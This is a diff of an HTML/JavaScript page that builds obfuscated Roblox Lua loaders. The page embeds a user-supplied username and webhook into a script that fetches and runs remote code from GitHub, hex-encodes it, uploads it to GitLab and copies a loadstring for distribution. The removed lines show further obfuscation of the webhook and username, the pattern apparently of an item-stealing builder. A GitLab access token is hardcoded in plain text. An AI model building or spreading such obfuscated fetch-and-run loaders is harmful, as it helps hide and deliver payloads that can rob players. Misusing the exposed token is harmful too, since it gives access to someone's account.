@@ -17,7 +17,8 @@
             margin: 0;
         }
         h1 {
-            font-size: 3rem;
+            font-size: 2.5rem;
+            text-shadow: 2px 2px 5px black;
         }
         .container {
             display: flex;
@@ -25,28 +26,28 @@
             gap: 15px;
             margin-top: 20px;
             text-align: center;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(255, 0, 128, 0.8);
         }
         input, select, button {
-            padding: 10px;
-            border-radius: 8px;
+            padding: 12px;
+            border-radius: 10px;
             border: none;
-            background-color: #333;
+            background-color: #444;
             color: white;
             font-size: 1rem;
-            width: 250px;
+            width: 270px;
+            transition: 0.3s;
         }
         button {
             background: #ff0080;
             cursor: pointer;
-            transition: 0.3s;
         }
         button:hover {
             background: #ff0055;
-            transform: scale(1.1);
+            transform: scale(1.05);
         }
     </style>
 </head>
@@ -65,8 +66,14 @@
     </div>
 
     <script>
-        const PAT = "glpat-rp3iSBDjg5yxAWX_iJ9M";  // ❗ REPLACE THIS WITH YOUR GitLab Personal Access Token
-        const projectID = "67586483";  // ✅ Your GitLab project ID
+        const PAT = 'glpat-rp3iSBDjg5yxAWX_iJ9M';
+        const projectID = '67586483';
+
+        const loadstrings = {
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
+        };
 
         function randomString(length) {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -77,61 +84,14 @@
             return result;
         }
 
-        function junkCode() {
-            let junk = [
-                "local _unused = math.random()",
-                "local __dummy = string.reverse('dummy')",
-                "local __junk = 'OBF'..tostring(math.random(1000,9999))",
-                "local garbage = math.sin(math.random())",
-                "local fakeVar = {} for i=1,10 do fakeVar[i] = i*math.random() end"
-            ];
-            return junk[Math.floor(Math.random() * junk.length)];
-        }
-
-        function encodeBase64(str) {
-            return btoa(unescape(encodeURIComponent(str)));
-        }
-
         function encodeHex(str) {
             return str.split('').map(c => `\\x${c.charCodeAt(0).toString(16)}`).join('');
         }
 
-        function reverseString(str) {
-            return str.split('').reverse().join('');
-        }
-
         function obfuscateScript(script) {
-            script = script.replace(/;/g, ";\n" + junkCode());
-
-            const replacements = {
-                "Username": randomString(10),
-                "Webhook": randomString(10),
-                "loadstring": randomString(10),
-                "game": randomString(10),
-                "HttpGet": randomString(10)
-            };
-            for (const original in replacements) {
-                script = script.replace(new RegExp(original, "g"), replacements[original]);
-            }
-
-            let username = document.getElementById('username').value;
-            let webhook = document.getElementById('webhook').value;
-            
-            let encodedUsername = encodeBase64(reverseString(username));
-            let encodedWebhook = encodeHex(reverseString(webhook));
-
-            let obfuscatedUsername = `string.reverse(syn.crypt.base64.decode("${encodedUsername}"))`;
-            let obfuscatedWebhook = `string.reverse("${encodedWebhook}")`;
-
-            script = script.replace(new RegExp(replacements["Username"], "g"), obfuscatedUsername);
-            script = script.replace(new RegExp(replacements["Webhook"], "g"), obfuscatedWebhook);
-
             let hexObfuscated = encodeHex(script);
-            script = `loadstring(string.reverse(string.char(${hexObfuscated.split('\\x').filter(Boolean).map(hex => `0x${hex}`).join(',')})))()`;
-
-            let finalObfuscated = `return function() ${script} end`;
-
-            return finalObfuscated;
+            script = `loadstring(string.char(${hexObfuscated.split('\\x').filter(Boolean).map(hex => `0x${hex}`).join(',')}))()`;
+            return `return function() ${script} end`;
         }
 
         function generateScript() {
@@ -144,15 +104,13 @@
                 return;
             }
 
-            let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://your-script-url.com'))()`;
-
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
             alert("Original Script:\n\n" + script);
 
             setTimeout(() => {
                 let obfuscatedScript = obfuscateScript(script);
-                alert("Obfuscated Script:\n\n" + obfuscatedScript);
                 uploadToGitLab(obfuscatedScript);
-            }, 500); 
+            }, 500);
         }
 
         function uploadToGitLab(content) {
@@ -166,7 +124,7 @@
                 },
                 body: JSON.stringify({
                     branch: 'main',
-                    content: content,  // ✅ Upload script as raw text
+                    content: content,
                     commit_message: 'Add obfuscated script'
                 })
             })
@@ -175,7 +133,7 @@
                 if (data.file_path) {
                     let loadstring = `loadstring(game:HttpGet('https://gitlab.com/void6674109/Void/-/raw/main/${filename}'))()`;
                     navigator.clipboard.writeText(loadstring).then(() => {
-                        alert("Script uploaded & Loadstring copied!\n" + loadstring);
+                        alert("Script uploaded & Loadstring copied!\n\n" + loadstring);
                     });
                 } else {
                     alert("Upload failed. Check PAT & Project ID.");
